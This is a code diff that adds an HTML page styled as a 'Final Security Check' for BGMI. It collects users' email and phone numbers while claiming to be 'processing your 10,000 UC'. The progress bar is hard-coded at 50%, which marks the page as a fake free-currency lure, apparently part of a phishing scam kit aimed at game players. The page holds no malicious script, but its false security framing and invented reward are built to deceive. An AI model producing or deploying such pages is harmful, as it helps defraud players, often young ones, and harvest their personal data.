@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Final Verification - BGMI</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+    <div class="verify-container">
+        <div class="verify-header">
+            <h2><i class="fas fa-user-check"></i> FINAL SECURITY CHECK</h2>
+            <p>Complete verification to prevent fraud</p>
+        </div>
+
+        <div class="verify-box">
+            <form action="/verify-account" method="POST">
+                <div class="input-group">
+                    <i class="fas fa-envelope"></i>
+                    <input type="email" name="email" placeholder="Email address (for receipt)">
+                </div>
+                
+                <div class="input-group">
+                    <i class="fas fa-phone"></i>
+                    <input type="tel" name="phone" placeholder="Phone number (optional)">
+                </div>
+
+                <button type="submit" class="verify-btn">
+                    <i class="fas fa-paper-plane"></i> COMPLETE VERIFICATION
+                </button>
+            </form>
+
+            <div class="progress-info">
+                <p><i class="fas fa-sync-alt fa-spin"></i> Processing your 10,000 UC...</p>
+                <div class="progress-bar">
+                    <div class="progress-fill" style="width: 50%"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
